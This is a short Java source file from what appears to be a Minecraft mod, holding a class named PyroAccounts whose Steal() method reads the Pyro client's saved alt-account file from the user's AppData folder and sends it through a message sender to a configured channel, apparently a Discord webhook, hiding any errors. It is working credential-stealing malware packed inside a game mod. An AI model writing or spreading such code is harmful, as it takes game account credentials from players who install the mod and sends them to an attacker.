package com.example.examplemod.Hacks.FilesGrabber.Pyro;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class PyroAccounts {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\alts.json"));
         SendMessage.doThing("```PyroAccaunts ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol321");
      }

   }
}
